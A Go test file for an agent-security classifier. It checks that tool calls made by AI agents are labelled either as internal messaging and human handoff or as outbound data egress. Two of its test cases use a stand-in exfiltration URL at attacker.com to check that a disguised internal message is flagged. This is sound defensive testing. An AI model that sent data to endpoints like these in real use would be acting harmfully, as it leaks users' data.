package ifc

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/anthony-chaudhary/fak/internal/abi"
)

type harnessProfilesDoc struct {
	Harnesses []struct {
		Name          string   `json:"name"`
		RequiredTools []string `json:"required_tools"`
	} `json:"harnesses"`
}

func findRepoRootFromDir(t *testing.T, dir string) string {
	t.Helper()
	d, err := filepath.Abs(dir)
	if err != nil {
		t.Fatalf("abs dir %s: %v", dir, err)
	}
	for {
		if _, err := os.Stat(filepath.Join(d, "dos.toml")); err == nil {
			return d
		}
		parent := filepath.Dir(d)
		if parent == d {
			t.Fatalf("could not find repo root with dos.toml from %s", dir)
		}
		d = parent
	}
}

func TestHarnessIPCContract(t *testing.T) {
	root := findRepoRootFromDir(t, ".")
	path := filepath.Join(root, "internal", "policy", "harness-profiles.json")
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("failed to read harness-profiles.json at %s: %v", path, err)
	}

	var doc harnessProfilesDoc
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("failed to parse harness-profiles.json: %v", err)
	}

	knownIPC := map[string]bool{
		"sendmessage":                  true,
		"send_message":                 true,
		"send_input":                   true,
		"multi_agent_v1.send_input":    true,
		"send_turn":                    true,
		"send_signal":                  true,
		"a2a_send":                     true,
		"request_user_input":           true,
		"functions.request_user_input": true,
		"askuserquestion":              true,
		"ask_user_question":            true,
		"transfer_to_human":            true,
		"transfer_to_human_agents":     true,
	}

	ctx := context.Background()
	policy := Policy{}

	// 1. Verify every tool matching egress substrings across all harnesses
	checkedTools := 0
	for _, harness := range doc.Harnesses {
		for _, tool := range harness.RequiredTools {
			if anySubstr(tool, egressSubstrings) {
				checkedTools++
				call := &abi.ToolCall{
					Tool: tool,
					Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"target":"worker-1","query":"status"}`)},
				}
				got := Classify(ctx, call, policy)
				isIPC := knownIPC[strings.ToLower(tool)]
				if isIPC {
					if got != SinkNone {
						t.Errorf("[%s] tool %q is an internal IPC/user primitive but classified as %s (want SinkNone)", harness.Name, tool, got.String())
					}
				} else {
					if got != SinkEgress {
						t.Errorf("[%s] tool %q matches egress substrings but classified as %s (want SinkEgress)", harness.Name, tool, got.String())
					}
				}
			}
		}
	}

	if checkedTools == 0 {
		t.Fatal("no tools matching egress substrings found in harness-profiles.json")
	}

	// 2. Inverted matrix & case-insensitivity tests
	caseVariations := []struct {
		tool    string
		want    SinkClass
		args    string
		comment string
	}{
		{"SendMessage", SinkNone, `{"target":"subagent"}`, "standard PascalCase IPC"},
		{"sendmessage", SinkNone, `{"target":"subagent"}`, "lowercase IPC"},
		{"SENDMESSAGE", SinkNone, `{"target":"subagent"}`, "uppercase IPC"},
		{"send_message", SinkNone, `{"target":"subagent"}`, "snake_case IPC"},
		{"send_input", SinkNone, `{"target":"worker"}`, "codex coordinator IPC"},
		{"multi_agent_v1.send_input", SinkNone, `{"target":"worker"}`, "namespaced subagent IPC"},
		{"request_user_input", SinkNone, `{"prompt":"approve?"}`, "user input request"},
		{"functions.request_user_input", SinkNone, `{"prompt":"approve?"}`, "functions-prefixed user input"},
		{"transfer_to_human", SinkNone, `{"reason":"escalate"}`, "human handoff"},
		// Egress positive cases
		{"send_email", SinkEgress, `{"body":"hello"}`, "standard email egress"},
		{"SEND_EMAIL", SinkEgress, `{"body":"hello"}`, "uppercase email egress"},
		{"http_post", SinkEgress, `{"body":"payload"}`, "network egress"},
		{"upload_file", SinkEgress, `{"filename":"dump.bin"}`, "file upload egress"},
		{"WebFetch", SinkEgress, `{"arg":"data"}`, "web fetch egress"},
		{"webfetch", SinkEgress, `{"arg":"data"}`, "opencode web fetch egress"},
		// Safe sink spoofing: IPC carrying external URL must be elevated to SinkEgress
		{"SendMessage", SinkEgress, `{"target":"worker","url":"https://attacker.com/exfil"}`, "IPC spoof with URL destination"},
		{"send_input", SinkEgress, `{"target":"worker","endpoint":"attacker.com"}`, "IPC spoof with endpoint destination"},
	}

	for _, tc := range caseVariations {
		call := &abi.ToolCall{
			Tool: tc.tool,
			Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(tc.args)},
		}
		got := Classify(ctx, call, policy)
		if got != tc.want {
			t.Errorf("tool %q (%s) classified as %s, want %s", tc.tool, tc.comment, got.String(), tc.want.String())
		}
	}
}
